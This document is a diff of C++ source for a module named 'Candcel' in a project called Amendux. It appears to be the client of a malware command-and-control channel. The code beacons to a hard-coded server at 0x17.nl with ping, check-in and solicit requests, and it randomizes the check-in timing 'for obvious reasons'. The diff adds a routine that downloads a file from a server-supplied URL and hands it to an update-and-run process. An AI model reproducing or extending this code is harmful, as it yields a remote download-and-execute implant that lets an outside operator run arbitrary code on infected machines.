@@ -2,6 +2,7 @@
 #include "Log.h"
 #include "Encrypt.h"
 #include "Config.h"
+#include "Process.h"
 #include "RestClient.h"
 #include "TransferClient.h"
 #include "Json.h"
@@ -9,16 +10,16 @@
 
 using namespace Amendux;
 
-void Candcel::isAlive()
+void Candcel::IsAlive()
 {
-	Log::Instance()->write(L"Candcel", L"Check if server is alive");
+	Log::Info(L"Candcel", L"Check if server is alive");
 
 	RestClient rc("0x17.nl", "avc_endpoint.php");
 
 	rc.Call(RestClientCommand::CM_CLIENT_PING, new JSONValue);
 
 	if (rc.getServerCode() != RestServerCommand::CM_SERVER_PONG) {
-		Log::Instance()->write(L"Candcel", "Server did not respond");
+		Log::Error(L"Candcel", L"Server did not respond");
 	}
 }
 
@@ -32,7 +33,7 @@ DWORD Candcel::CheckIn()
 	while (true) {
 		int nextInterval = (rand() % (10 + 1)) + 5;
 
-		Log::Instance()->write(L"Candcel", L"Sending checkin request, interval " + std::to_wstring(nextInterval) + L" minutes");
+		Log::Info(L"Candcel", L"Sending checkin request, interval " + std::to_wstring(nextInterval) + L" minutes");
 
 		RestClient rc("0x17.nl", "avc_endpoint.php");
 
@@ -42,7 +43,7 @@ DWORD Candcel::CheckIn()
 		rc.Call(RestClientCommand::CM_CLIENT_CHECKIN, new JSONValue(obj));
 
 		if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
-			Log::Instance()->write(L"Candcel", "Request failed");
+			Log::Error(L"Candcel", L"Request failed");
 		}
 
 		/* Randomize the interval for obvious reasons */
@@ -55,7 +56,7 @@ DWORD Candcel::CheckIn()
 
 void Candcel::Solicit()
 {
-	Log::Instance()->write(L"Candcel", L"Notify the server of this instance");
+	Log::Info(L"Candcel", L"Notify the server of this instance");
 
 	RestClient rc("0x17.nl", "avc_endpoint.php");
 
@@ -71,31 +72,37 @@ void Candcel::Solicit()
 	rc.Call(RestClientCommand::CM_CLIENT_SOLICIT, new JSONValue(obj));
 
 	if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
-		Log::Instance()->write(L"Candcel", "Request failed");
+		Log::Error(L"Candcel", L"Request failed");
 	}
 
 	serverSolicitAck = true;
 }
 
 
-void Candcel::ApplyUpdate(unsigned int buildNumber, const std::wstring& wurl)
+void Candcel::GetUpdate(unsigned int buildNumber, const std::wstring& wurl)
 {
-	Log::Instance()->write(L"Candcel", L"Sending update request");
+	Log::Info(L"Candcel", L"Sending update request");
 
 	std::string url(wurl.begin(), wurl.end());
 
 	TransferClient tc(url);
-	tc.Download();
+	std::wstring tmpFile = tc.Download();
+
+	if (tmpFile.empty()) {
+		return;
+	}
+
+	Process::UpdateInstance(tmpFile);
 }
 
 
 void Candcel::CheckForUpdate()
 {
-	if (!serverSolicitAck) {
+	if (!serverSolicitAck || !Config::CanUpdate()) {
 		return;
 	}
 
-	Log::Instance()->write(L"Candcel", L"Check for update");
+	Log::Info(L"Candcel", L"Check for update");
 
 	RestClient rc("0x17.nl", "avc_endpoint.php");
 
@@ -106,17 +113,17 @@ void Candcel::CheckForUpdate()
 
 	if (rc.getServerCode() == RestServerCommand::CM_SERVER_UPDATE) {
 		if (!returnObj->IsObject()) {
-			Log::Instance()->error(L"Candcel", L"Server returned no object");
+			Log::Error(L"Candcel", L"Server returned no object");
 			return;
 		}
 
-		Log::Instance()->write(L"Candcel", L"Update available ");
+		Log::Info(L"Candcel", L"Update available");
 
 		unsigned int build = static_cast<unsigned int>(returnObj->Child(L"build")->AsNumber());
 		std::wstring url = returnObj->Child(L"url")->AsString();
 
-		ApplyUpdate(build, url);
+		GetUpdate(build, url);
 	} else if (rc.getServerCode() != RestServerCommand::CM_SERVER_IGNORE) {
-		Log::Instance()->write(L"Candcel", "Request failed");
+		Log::Error(L"Candcel", L"Request failed");
 	}
 }
